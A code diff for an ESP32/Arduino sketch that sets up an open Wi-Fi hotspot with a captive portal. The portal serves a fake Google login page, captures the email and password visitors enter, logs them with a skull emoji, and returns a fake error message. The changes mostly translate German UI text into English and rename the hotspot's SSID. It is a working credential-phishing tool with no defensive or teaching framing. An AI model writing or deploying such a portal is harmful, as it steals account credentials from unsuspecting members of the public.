@@ -3,7 +3,7 @@
 #include <DNSServer.h>
 #include <vector>
 
-const char *ssid = "Free Public Wi-Fi";
+const char *ssid = "((TEST))";
 const char *password = "";
 const byte DNS_PORT = 53;
 IPAddress apIP(8, 8, 8, 8);
@@ -128,10 +128,10 @@ const char* loginPage = R"rawliteral(
       <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
     </svg>
     <h1>Login</h1>
-    <p class="subtitle">Mit Google-Login</p>
+    <p class="subtitle">Use Your Google Account</p>
     <form action="/" method="POST">
       <div class="form-group">
-        <input type="email" class="form-control" name="user" placeholder="Email adress" required>
+        <input type="email" class="form-control" name="user" placeholder="Email address" required>
       </div>
       <div class="form-group">
         <input type="password" class="form-control" name="pass" placeholder="Password" required>
@@ -295,7 +295,7 @@ void setup() {
       logins.push_back({ email, password });
       Serial.printf("💀 Login: %s / %s\n", email.c_str(), password.c_str());
     }
-    request->send(200, "text/html", "<h3>Fehler beim Anmelden. Bitte später erneut versuchen.</h3>");
+    request->send(200, "text/html", "<h3>Error logging in. Please try again later.</h3>");
   });
 
   // Admin login page
@@ -315,7 +315,7 @@ void setup() {
       } else {
         // PIN is incorrect, show error
         String html = String(adminLoginPage);
-        html.replace("%ERROR_MESSAGE%", "<div class='error'>Falscher PIN! Bitte erneut versuchen.</div>");
+        html.replace("%ERROR_MESSAGE%", "<div class='error'>Incorrect PIN! Please try again.</div>");
         request->send(200, "text/html", html);
       }
     } else {
@@ -329,7 +329,7 @@ void setup() {
     request->redirect("/admin");
   });
 
-  // Fallback-Handler für nicht definierte Routen
+  // Fallback-Handler for undefined routes
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
   
   server.begin();
